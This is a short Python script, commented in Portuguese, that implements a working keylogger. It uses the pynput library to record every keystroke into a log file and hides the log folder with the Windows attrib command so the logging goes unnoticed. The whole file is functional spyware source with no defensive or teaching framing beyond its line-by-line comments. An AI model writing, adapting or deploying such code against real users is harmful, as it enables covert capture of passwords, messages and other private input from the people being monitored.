from pynput.keyboard import Key, Listener  # Importa Key e Listener para capturar eventos de teclado
import os  # Importa o módulo os para manipulação de diretórios
import subprocess  # Importa subprocess para executar comandos no sistema

# Caminho absoluto para salvar os logs em "C:\logs"
log_dir = "C:\\logs"
log_file = os.path.join(log_dir, "keylogs.txt")

# Verifica se a pasta existe, caso contrário, cria a pasta
if not os.path.exists(log_dir):
    os.makedirs(log_dir)
    # Torna a pasta oculta no Windows
    subprocess.call(["attrib", "+h", log_dir])

def on_press(key):
    """Função que captura a tecla pressionada e a salva no arquivo de log."""
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")  # Grava a tecla digitada
        except AttributeError:
            # Caso seja uma tecla especial (como Ctrl, Alt, etc.)
            f.write(f" {key} ")

def on_release(key):
    """Função que verifica se a tecla de saída foi pressionada."""
    if key == Key.esc:  # Sai do keylogger quando a tecla 'Esc' é pressionada.
        return False

# Configura o listener de teclado
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # Mantém o listener ativo até que seja interrompido